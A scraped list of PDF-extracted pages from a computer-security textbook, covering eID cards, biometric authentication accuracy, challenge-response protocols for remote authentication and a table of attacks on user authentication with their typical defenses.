       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 109, 'page_label': '108'}, page_content='108  CHAPTER 3 / UsER AUTHEnTiCATion\\nThe ePass -function is an offline function. That is, it is not used over a network, \\nbut is used in a situation where the cardholder presents the card for a particular ser-\\nvice at that location, such as going through a passport control checkpoint.\\nThe eID function can be used for both online and offline services. An exam -\\nple of an offline use is an inspection system. An inspection system is a terminal \\nfor law enforcement checks, for example, by police or border control officers. An \\n inspection system can read identifying information of the cardholder as well as bio-\\nmetric  information stored on the car d, such as facial image and fingerprints. The \\nbiometric information can be used to verify that the individual in possession of the \\ncard is the actual cardholder.\\nUser authentication is a good example of online use of the eID function.  \\nFigure 3.7 illustrates a Web-based scenario. To begin, an eID user visits a website and \\nrequests a service that requires authentication. The Web site sends back a redirect \\nmessage that forward an authentication request to an eID server. The eID server \\nrequests that the user enter the PIN number for the eID card. Once the user has \\ncorrectly entered the PIN, data can be exchanged between the eID card and the \\nterminal reader in encrypted form. The server then engages in an authentication \\nprotocol exchange with the microprocessor on the eID card. If the user is authenti -\\ncated, the results are sent back to the user system to be redirected to the Web server \\napplication.\\nFunction Purpose PACE Password Data Uses\\nePass (mandatory)\\nAuthorized offline \\ninspection systems \\nread the data.\\nCAN or MRZ\\nFace image; two \\nfingerprint images \\n(optional); MRZ \\ndata\\nOffline biometric \\nidentity verifica-\\ntion reserved for \\ngovernment access\\neID (activation \\noptional)\\nOnline applica-\\ntions read the data \\nor access functions \\nas authorized.\\neID PIN Family and given \\nnames; artistic name \\nand doctoral degree: \\ndate and place of \\nbirth; address and \\n community ID; \\nexpiration date\\nIdentification; age \\nverification; com-\\nmunity ID verifi-\\ncation; restricted \\nidentification \\n(pseudonym); \\nrevocation query\\nOffline inspection \\nsystems read the \\ndata and update \\nthe address and \\ncommunity ID.\\nCAN or MRZ\\neSign (certificate \\noptional)\\nA certification \\nauthority installs \\nthe signature  \\ncertificate online.\\neID PIN\\nSignature key;\\nX.509 certificate\\nElectronic \\n signature creationCitizens make \\nelectronic signa-\\nture with eSign \\nPIN.\\nCAN\\nCAN = card access number\\nMRZ = machine@readable zone\\nPACE = password authenticated connection establishment\\nPIN = personal identification number\\nTable 3.4 Electronic Functions and Data for eID Cards\\nM03_STAL0611_04_GE_C03.indd   108 10/11/17   2:44 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 110, 'page_label': '109'}, page_content='3.4 / BioMETRiC AUTHEnTiCATion  109\\nFor the preceding scenario, the appropriate software and hardware are required \\non the user system. Software on the main user system includes functionality for \\nrequesting and accepting the PIN number and for message redirection. The hard -\\nware required is an eID card reader. The card reader can be an external contact or \\ncontactless reader or a contactless reader internal to the user system.\\nPAssword  A uthentic Ated connection  estABLishment  (PA ce) Password \\nAuthenticated Connection Establishment (PACE) ensures that the contactless RF \\nchip in the eID card cannot be read without explicit access control. For online appli-\\ncations, access to the card is established by the user entering the 6-digit PIN, which \\nshould only be known to the holder of the card. For offline applications, either the \\nMRZ printed on the back of the card or the six-digit card access number (CAN) \\nprinted on the front is used.\\n 3.4 BIOMETRIC AUTHENTICATION\\nA biometric authentication system attempts to authenticate an individual based on \\nhis or her unique physical characteristics. These include static characteristics, such \\nas fingerprints, hand geometry, facial characteristics, and retinal and iris patterns; \\nFigure 3.7 User Authentication with eID\\neID\\nserver\\nHost/application\\nserver\\n6.  User enters PIN\\n1.  User requests service\\n(e.g., via Web browser)\\n4. Authentication request\\n5. PIN request\\n7. Authentication protocol exchange\\n8. Authentication result for redirect\\n2. Service request\\n3. Redirect to eID message\\n9. Authentication result forwarded\\n10. Service granted\\nM03_STAL0611_04_GE_C03.indd   109 10/11/17   2:44 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 111, 'page_label': '110'}, page_content='110  CHAPTER 3 / UsER AUTHEnTiCATion\\nand dynamic characteristics, such as voiceprint and signature. In essence, biomet -\\nrics is based on pattern recognition. Compared to passwords and tokens, biometric \\nauthentication is both technically more complex and expensive. While it is used in a \\nnumber of specific applications, biometrics has yet to mature as a standard tool for \\nuser authentication to computer systems.\\nPhysical Characteristics Used in Biometric Applications\\nA number of different types of physical characteristics are either in use or under \\nstudy for user authentication. The most common are the following:\\n• Facial characteristics:  Facial characteristics are the most common means \\nof human-to-human identification; thus it is natural to consider them for \\n identification by computer.  The most common approach is to define charac -\\nteristics based on relative location and shape of key facial features, such as \\neyes,  eyebrows, nose, lips, and chin shape. An alternative approach is to use an \\n infrared camera to produce a face thermogram that correlates with the underly-\\ning vascular system in the human face.\\n• Fingerprints: Fingerprints have been used as a means of identification for cen-\\nturies, and the process has been systematized and automated particularly for \\nlaw enforcement purposes. A fingerprint is the pattern of ridges and furrows on \\nthe surface of the fingertip. Fingerprints are believed to be unique across the \\nentire human population. In practice, automated fingerprint recognition and \\nmatching system extract a number of features from the fingerprint for storage \\nas a numerical surrogate for the full fingerprint pattern.\\n• Hand geometry: Hand geometry systems identify features of the hand, includ-\\ning shape, and lengths and widths of fingers.\\n• Retinal pattern:  The pattern formed by veins beneath the retinal surface is \\nunique and therefore suitable for identification. A retinal biometric system \\nobtains a digital image of the retinal pattern by projecting a low-intensity beam \\nof visual or infrared light into the eye.\\n• Iris: Another unique physical characteristic is the detailed structure of the iris.\\n• Signature: Each individual has a unique style of handwriting and this is reflected \\nespecially in the signature, which is typically a frequently written sequence. \\nHowever, multiple signature samples from a single individual will not be identi-\\ncal. This complicates the task of developing a computer representation of the \\nsignature that can be matched to future samples.\\n• Voice: Whereas the signature style of an individual reflects not only the unique \\nphysical attributes of the writer but also the writing habit that has developed, \\nvoice patterns are more closely tied to the physical and anatomical characteris-\\ntics of the speaker. Nevertheless, there is still a variation from sample to sample \\nover time from the same speaker, complicating the biometric recognition task.\\nFigure 3.8 gives a rough indication of the relative cost and accuracy of these \\nbiometric measures. The concept of accuracy does not apply to user authentication \\nschemes using smart cards or passwords. For example, if a user enters a password, \\nit either matches exactly the password expected for that user or not. In the case of \\nM03_STAL0611_04_GE_C03.indd   110 10/11/17   2:44 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 112, 'page_label': '111'}, page_content='3.4 / BioMETRiC AUTHEnTiCATion  111\\nbiometric parameters, the system instead must determine how closely a presented \\nbiometric characteristic matches a stored characteristic. Before elaborating on the \\nconcept of biometric accuracy, we need to have a general idea of how biometric \\nsystems work.\\nOperation of a Biometric Authentication System\\nFigure 3.9 illustrates the operation of a biometric system. Each individual who is to be \\nincluded in the database of authorized users must first be enrolled in the system. This \\nis analogous to assigning a password to a user. For a biometric system, the user pres-\\nents a name and, typically, some type of password or PIN to the system. At the same \\ntime, the system senses some biometric characteristic of this user (e.g.,  fingerprint \\nof right index finger). The system digitizes the input then extracts a set of features \\nthat can be stored as a number or set of numbers representing this unique biometric \\ncharacteristic; this set of numbers is referred to as the user’s template. The user is now \\nenrolled in the system, which maintains for the user a name (ID), perhaps a PIN or \\npassword, and the biometric value.\\nDepending on application, user authentication on a biometric system involves \\neither verification or identification. Verification is analogous to a user logging on to \\na system by using a memory card or smart card coupled with a password or PIN. For \\nbiometric verification, the user enters a PIN and also uses a biometric sensor. The \\nsystem extracts the corresponding feature and compares that to the template stored \\nfor this user. If there is a match, then the system authenticates this user.\\nFor an identification system, the individual uses the biometric sensor but pres-\\nents no additional information. The system then compares the presented template \\nwith the set of stored templates. If there is a match, then this user is identified. Oth-\\nerwise, the user is rejected.\\nBiometric Accuracy\\nIn any biometric scheme, some physical characteristic of the individual is mapped \\ninto a digital representation. For each individual, a single digital representation, or \\nFigure 3.8 Cost Versus Accuracy of Various Biometric \\nCharacteristics in User Authentication Schemes\\nAccuracy\\nCost\\nHand\\nSignature\\nRetina\\nIris\\nFingerFace\\nVoice\\nM03_STAL0611_04_GE_C03.indd   111 10/11/17   2:44 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 113, 'page_label': '112'}, page_content='112  CHAPTER 3 / UsER AUTHEnTiCATion\\ntemplate, is stored in the computer. When the user is to be authenticated, the system \\ncompares the stored template to the presented template. Given the complexities of \\nphysical characteristics, we cannot expect that there will be an exact match between \\nthe two templates. Rather, the system uses an algorithm to generate a matching \\nscore (typically a single number) that quantifies the similarity between the input and \\nthe\\xa0stored template. To proceed with the discussion, we define the following terms. \\nThe false match rate is the frequency with which biometric samples from different \\nsources are erroneously assessed to be from the same source. The false nonmatch rate \\nis the frequency with which samples from the same source are erroneously assessed \\nto be from different sources.\\nFigure 3.10 illustrates the dilemma posed to the system. If a single user is tested \\nby the system numerous times, the matching score s will vary, with a probability \\nFigure 3.9 A Generic Biometric System  Enrollment creates an association \\nbetween a user and the user’s biometric characteristics. Depending on the appli-\\ncation, user authentication either involves verifying that a claimed user is the \\nactual user or identifying an unknown user.\\nBiometric\\nsensor\\nUser interface\\nName (PIN)\\n(a) Enrollment\\nFeature\\nextractor\\nBiometric\\nBiometric\\ndatabase\\nBiometric\\ndatabase\\nsensor\\nUser interface\\nName (PIN)\\n(b) Veriﬁcation\\nTrue/false\\nOne template\\nFeature\\nextractor\\nFeature\\nmatcher\\nBiometric\\nsensor\\nUser interface\\n(c) Identiﬁcation\\nUser’s identity or\\n“user unidentiﬁed” N templates\\nFeature\\nextractor\\nFeature\\nmatcher\\nBiometric\\ndatabase\\nM03_STAL0611_04_GE_C03.indd   112 10/11/17   2:44 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 114, 'page_label': '113'}, page_content='3.4 / BioMETRiC AUTHEnTiCATion  113\\ndensity function typically forming a bell curve, as shown. For example, in the case of a \\nfingerprint, results may vary due to sensor noise; changes in the print due to swelling \\nor dryness; finger placement; and so on. On average, any other individual should have \\na much lower matching score, but again will exhibit a bell-shaped probability density \\nfunction. The difficulty is that the range of matching scores produced by two individu-\\nals, one genuine and one an imposter, compared to a given reference template, are \\nlikely to overlap. In Figure 3.10, a threshold value is selected thus that if the presented \\nvalue s Ú t a match is assumed, and for s 6 t, a mismatch is assumed. The shaded part \\nto the right of t indicates a range of values for which a false match is possible, and the \\nshaded part to the left indicates a range of values for which a false nonmatch is pos-\\nsible. A false match results in the acceptance of a user who should not be accepted, \\nand a false mismatch triggers the rejection of a valid user. The area of each shaded \\npart represents the probability of a false match or nonmatch, respectively. By moving \\nthe threshold, left or right, the probabilities can be altered, but note that a decrease \\nin false match rate results in an increase in false nonmatch rate, and vice versa.\\nFor a given biometric scheme, we can plot the false match versus false nonmatch \\nrate, called the operating characteristic curve. Figure 3.11 shows idealized curves for \\ntwo different systems. The curve that is lower and to the left performs better. The \\ndot on the curve corresponds to a specific threshold for biometric testing. Shifting \\nthe threshold along the curve up and to the left provides greater security and the \\ncost of decreased convenience. The inconvenience comes from a valid user being \\ndenied access and being required to take further steps. A plausible trade-off is to \\nFigure 3.10 Profiles of a Biometric Characteristic of an Imposter and an \\nAuthorized User In this depiction, the comparison between the presented \\nfeature and a reference feature is reduced to a single numeric value. If \\nthe input value ( s) is greater than a preassigned threshold ( t), a match is \\ndeclared.\\nDecision\\nthreshold (t)Imposter\\nproﬁle\\nProﬁle of\\ngenuine user\\nFalse\\nmatch\\npossible\\nFalse\\nnonmatch\\npossible\\nMatching score (s)Average matching\\nvalue of imposter\\nAverage matching\\nvalue of genuine user\\nProbability\\ndensity function\\nM03_STAL0611_04_GE_C03.indd   113 10/11/17   2:44 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 115, 'page_label': '114'}, page_content='114  CHAPTER 3 / UsER AUTHEnTiCATion\\npick a threshold that corresponds to a point on the curve where the rates are equal. \\nA high-security application may require a very low false match rate, resulting in a \\npoint farther to the left on the curve. For a forensic application, in which the system \\nis looking for possible candidates, to be checked further, the requirement may be for \\na low false nonmatch rate.\\nFigure 3.12 shows characteristic curves developed from actual product testing. \\nThe iris system had no false matches in over 2 million cross-comparisons. Note that \\nover a broad range of false match rates, the face biometric is the worst performer.\\n 3.5 REMOTE USER AUTHENTICATION\\nThe simplest form of user authentication is local authentication, in which a user \\nattempts to access a system that is locally present, such as a stand-alone office PC \\nor an ATM machine. The more complex case is that of remote user authentication, \\nwhich takes place over the Internet, a network, or a communications link. Remote \\nuser authentication raises additional security threats, such as an eavesdropper being \\nFigure 3.11 Idealized Biometric Measurement Operating Characteristic Curves \\n(log-log scale)\\nIncrease threshold\\nIncreased\\nsecurity,decreased convenience\\nDecrease threshold\\nDecreased\\nsecurity,increasedconvenience\\n0.0001% 0.001% 0.01% 0.1%\\n100%\\n10%\\n1%\\n0.1%\\n1% 10% 100%\\nFalse match rate\\nFalse nonmatch rate\\nEqual error rate line\\nM03_STAL0611_04_GE_C03.indd   114 10/11/17   2:44 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 116, 'page_label': '115'}, page_content='3.5 / REMoTE UsER AUTHEnTiCATion  115\\nable to capture a password, or an adversary replaying an authentication sequence \\nthat has been observed.\\nTo counter threats to remote user authentication, systems generally rely on some \\nform of challenge-response protocol. In this section, we present the basic elements \\nof such protocols for each of the types of authenticators discussed in this chapter.\\nPassword Protocol\\nFigure 3.13a provides a simple example of a challenge-response protocol for authen-\\ntication via password. Actual protocols are more complex, such as Kerberos, to be \\ndiscussed in Chapter 23. In this example, a user first transmits his or her identity to \\nthe remote host. The host generates a random number r, often called a nonce, and \\nreturns this nonce to the user. In addition, the host specifies two functions, h() and \\nf(), to be used in the response. This transmission from host to user is the challenge. \\nThe user’s response is the quantity f(r/uni2032, h(P/uni2032)), where r/uni2032= r and P/uni2032 is the user’s \\npassword. The\\xa0function h is a hash function, so the response consists of the hash func-\\ntion of the user’s password combined with the random number using the function f.\\nThe host stores the hash function of each registered user’s password, depicted \\nas h(P(U)) for user U. When the response arrives, the host compares the incom -\\ning f(r/uni2032, h(P/uni2032)) to the calculated f(r, h(P(U))). If the quantities match, the user is \\nauthenticated.\\nThis scheme defends against several forms of attack. The host stores not the \\npassword but a hash code of the password. As discussed in Section 3.2, this secures \\nthe password from intruders into the host system. In addition, not even the hash of the \\npassword is transmitted directly, but rather a function in which the password hash is \\none of the arguments. Thus, for a suitable function f, the password hash cannot be cap-\\ntured during transmission. Finally, the use of a random number as one of the arguments \\nFigure 3.12 Actual Biometric Measurement Operating Characteristic \\nCurves To clarify differences among systems, a log-log scale is used.\\nSource: From [MANSO1]. Mansfield, T., Gavin Kelly, David Chandler, \\nJan Kane. Biometric Product Testing Final Report. National Physics \\nLaboratory, United Kingdom, March 2001. United Kingdom National \\nArchives, Open Government Licence v3.0. \\n0.0001% 0.001% 0.01% 0.1%\\n0.1%\\nFalse match rate\\nFalse nonmatch rate\\n1%\\n1%\\n10% 100%\\n10%\\nFace Fingerprint Voice Hand Iris\\n100%\\nM03_STAL0611_04_GE_C03.indd   115 10/11/17   2:45 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 117, 'page_label': '116'}, page_content=\"116  CHAPTER 3 / UsER AUTHEnTiCATion\\nof f defends against a replay attack, in which an adversary captures the user’s transmis-\\nsion and attempts to log on to a system by retransmitting the user’s messages.\\nToken Protocol\\nFigure 3.13b provides a simple example of a token protocol for authentication. As \\nbefore, a user first transmits his or her identity to the remote host. The host returns a \\nFigure 3.13 Basic Challenge-Response Protocols for Remote User Authentication\\nSource: Based on [OGOR03].\\nU\\nHostClient\\nU , User\\nE( r ', BS'( x '))\\nE–1 E( r ', BS'( x ')) =\\n( r ', BS'( x '))\\nextract B '\\nfrom ( r ', BS'( x '))\\nif r ' = r AND x ' = x\\nAND B' = B( U )\\nthen yes else no yes/no \\n(d) Protocol for dynamic biometric\\nif f( r ', h( W ')) =\\nf( r, h( W ( U )))\\nthen yes else no yes/no \\n(b) Protocol for a token\\nr, random number\\nx, random sequence\\nchallenge\\nE(), function( r, x, E())\\nf( r ', h( W '))\\n( r, h(), f())\\nB', x'        BS'( x ')\\nr ', return of r\\nP'        W '\\npassword to\\npasscode via token\\nr ', return of r\\nU\\nHostClient\\nU , User\\nE( r  ', D  ', BT  ')\\nE–1 E( r  ', P ', BT  ') =\\n( r ', P ', BT  ')\\nif r ' = r AND D  ' = D\\nAND BT  ' = BT ( U )\\nthen yes else no yes/no \\n(c) Protocol for static biometric\\nr, random number\\nE(), function( r, E())\\nB'        BT  ' biometric\\nD  ' biometric device\\nr ', return of r\\nU\\nHostClient\\nU , User\\nr, random number\\nh(), f(), functions\\nif f( r ', h( P')) =\\nf( r, h( P( U )))\\nthen yes else no yes/no \\n(a) Protocol for a password\\nf( r ', h( P'))\\n( r, h(), f())\\nP' \\nr ', return of r\\nU\\nHostClient\\nU , User\\nr, random number\\nh(), f(), functions\\nM03_STAL0611_04_GE_C03.indd   116 10/11/17   2:45 PM\"),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 118, 'page_label': '117'}, page_content='3.6 / sECURiTY issUEs FoR UsER AUTHEnTiCATion  117\\nrandom number and the identifiers of functions f() and h() to be used in the response. \\nAt the user end, the token provides a passcode W/uni2032. The token either stores a static \\npasscode or generates a one-time random passcode. For a one-time random pass -\\ncode, the token must be synchronized in some fashion with the host. In either case, \\nthe user activates the passcode by entering a password P/uni2032. This password is shared \\nonly between the user and the token and does not involve the remote host. The \\ntoken responds to the host with the quantity f(r/uni2032, h(W/uni2032)). For a static passcode, the \\nhost stores the hashed value h(W(U)); for a dynamic passcode, the host generates a \\none-time passcode (synchronized to that generated by the token) and takes its hash. \\nAuthentication then proceeds in the same fashion as for the password protocol.\\nStatic Biometric Protocol\\nFigure 3.13c is an example of a user authentication protocol using a static biometric. \\nAs before, the user transmits an ID to the host, which responds with a random num-\\nber r and, in this case, the identifier for an encryption E(). On the user side is a client \\nsystem that controls a biometric device. The system generates a biometric template \\nBT/uni2032 from the user’s biometric B/uni2032 and returns the ciphertext E(r/uni2032, D/uni2032, BT/uni2032), where D/uni2032 \\nidentifies this particular biometric device. The host decrypts the incoming message to \\nrecover the three transmitted parameters and compares these to locally stored values. \\nFor a match, the host must find r/uni2032= r. Also, the matching score between BT/uni2032 and \\nthe stored template must exceed a predefined threshold. Finally, the host provides \\na simple authentication of the biometric capture device by comparing the incoming \\ndevice ID to a list of registered devices at the host database.\\nDynamic Biometric Protocol\\nFigure 3.13d is an example of a user authentication protocol using a dynamic biomet-\\nric. The principal difference from the case of a stable biometric is that the host pro-\\nvides a random sequence as well as a random number as a challenge. The sequence \\nchallenge is a sequence of numbers, characters, or words. The human user at the client \\nend must then vocalize (speaker verification), type (keyboard dynamics verifica -\\ntion), or write (handwriting verification) the sequence to generate a biometric signal \\nBS/uni2032(x/uni2032). The client side encrypts the biometric signal and the random number. At \\nthe host side, the incoming message is decrypted. The incoming random number r/uni2032 \\nmust be an exact match to the random number that was originally used as a challenge \\n(r). In addition, the host generates a comparison based on the incoming biometric \\nsignal BS/uni2032(x/uni2032), the stored template BT(U) for this user and the original signal x. If \\nthe comparison value exceeds a predefined threshold, the user is authenticated.\\n 3.6 SECURITY ISSUES FOR USER AUTHENTICATION\\nAs with any security service, user authentication, particularly remote user authen -\\ntication, is subject to a variety of attacks. Table 3.5, from [OGOR03], summarizes \\nthe principal attacks on user authentication, broken down by type of authenticator. \\nMuch of the table is self-explanatory. In this section, we expand on some of the table’s \\nentries.\\nM03_STAL0611_04_GE_C03.indd   117 10/11/17   2:45 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 119, 'page_label': '118'}, page_content='118  CHAPTER 3 / UsER AUTHEnTiCATion\\nAttacks Authenticators Examples Typical Defenses\\nClient attack\\nPassword Guessing, exhaustive \\nsearch\\nLarge entropy; limited attempts\\nToken Exhaustive search Large entropy; limited attempts;  \\ntheft of object requires  \\npresence\\nBiometric False match Large entropy; limited  \\nattempts\\nHost attack\\nPassword Plaintext theft,  \\ndictionary/exhaustive \\nsearch\\nHashing; large entropy;  \\nprotection of password  \\ndatabase\\nToken Passcode theft Same as password; 1 -time  \\npasscode\\nBiometric Template theft Capture device authentication; \\n challenge response\\n Eavesdropping, \\ntheft, and \\ncopying\\nPassword “Shoulder surfing” User diligence to keep secret; \\n administrator diligence to quickly \\nrevoke compromised passwords; \\n multifactor authentication\\nToken Theft, counterfeiting \\nhardware\\nMultifactor authentication; tamper \\nresistant/evident token\\nBiometric Copying (spoofing) \\nbiometric\\nCopy detection at capture device  \\nand capture device  \\nauthentication\\nReplay\\nPassword Replay stolen password \\nresponse\\nChallenge-response protocol\\nToken Replay stolen passcode \\nresponse\\nChallenge-response protocol;  \\n1 -time passcode\\nBiometric Replay stolen biometric \\ntemplate response\\nCopy detection at capture  \\ndevice and capture device  \\nauthentication via challenge-  \\nresponse protocol\\nTrojan horse Password, token, \\nbiometric\\nInstallation of rogue \\n client or capture device\\nAuthentication of client or  \\ncapture device within trusted  \\nsecurity perimeter\\nDenial  \\nof service\\nPassword, token, \\nbiometric\\nLockout by multiple \\nfailed authentications\\nMultifactor with token\\nTable 3.5 Some Potential Attacks, Susceptible Authenticators, and Typical Defenses\\nClient attacks are those in which an adversary attempts to achieve user authen-\\ntication without access to the remote host or to the intervening communications \\npath. The adversary attempts to masquerade as a legitimate user. For a password-\\nbased system, the adversary may attempt to guess the likely user password. Multiple \\nguesses may be made. At the extreme, the adversary sequences through all possible \\npasswords in an exhaustive attempt to succeed. One way to thwart such an attack is \\nto select a password that is both lengthy and unpredictable. In effect, such a password \\nM03_STAL0611_04_GE_C03.indd   118 10/11/17   2:45 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 120, 'page_label': '119'}, page_content='3.7 / PRACTiCAL APPLiCATion: An iRis BioMETRiC sYsTEM  119\\nhas large entropy; that is, many bits are required to represent the password. Another \\ncountermeasure is to limit the number of attempts that can be made in a given time \\nperiod from a given source.\\nA token can generate a high-entropy passcode from a low-entropy PIN or pass-\\nword, thwarting exhaustive searches. The adversary may be able to guess or acquire \\nthe PIN or password, but must additionally acquire the physical token to succeed.\\nHost attacks are directed at the user file at the host where passwords, token \\npasscodes, or biometric templates are stored. Section 3.2 discusses the security consid-\\nerations with respect to passwords. For tokens, there is the additional defense of using \\none-time passcodes, so passcodes are not stored in a host passcode file. Biometric \\nfeatures of a user are difficult to secure because they are physical features of the user. \\nFor a static feature, biometric device authentication adds a measure of protection. For \\na dynamic feature, a challenge-response protocol enhances security.\\nEavesdropping in the context of passwords refers to an adversary’s attempt \\nto learn the password by observing the user, finding a written copy of the password, \\nor some similar attack that involves the physical proximity of user and adversary. \\nAnother form of eavesdropping is keystroke logging (keylogging), in which malicious \\nhardware or software is installed so that the attacker can capture the user’s keystrokes \\nfor later analysis. A system that relies on multiple factors (e.g., password plus token \\nor password plus biometric) is resistant to this type of attack. For a token, an analo-\\ngous threat is theft of the token or physical copying of the token. Again, a multifactor \\nprotocol resists this type of attack better than a pure token protocol. The analogous \\nthreat for a biometric protocol is copying or imitating the biometric parameter so as \\nto generate the desired template. Dynamic biometrics are less susceptible to such \\nattacks. For static biometrics, device authentication is a useful countermeasure.\\nReplay attacks involve an adversary repeating a previously captured user \\nresponse. The most common countermeasure to such attacks is the challenge-response \\nprotocol.\\nIn a Trojan horse attack, an application or physical device masquerades as an \\nauthentic application or device for the purpose of capturing a user password, pass -\\ncode, or biometric. The adversary can then use the captured information to masquer-\\nade as a legitimate user. A simple example of this is a rogue bank machine used to \\ncapture user ID/password combinations.\\nA denial-of-service attack attempts to disable a user authentication service by \\nflooding the service with numerous authentication attempts. A more selective attack \\ndenies service to a specific user by attempting logon until the threshold is reached \\nthat causes lockout to this user because of too many logon attempts. A multifactor \\nauthentication protocol that includes a token thwarts this attack, because the adver-\\nsary must first acquire the token.\\n 3.7 PRACTICAL APPLICATION: AN IRIS BIOMETRIC SYSTEM\\nAs an example of a biometric user authentication system, we look at an iris biometric \\nsystem that was developed for use by the United Arab Emirates (UAE) at border \\ncontrol points [DAUG04, TIRO05, NBSP08]. The UAE relies heavily on an outside \\nworkforce, and has increasingly become a tourist attraction. Accordingly, relative to \\nM03_STAL0611_04_GE_C03.indd   119 10/11/17   2:45 PM'),\n",
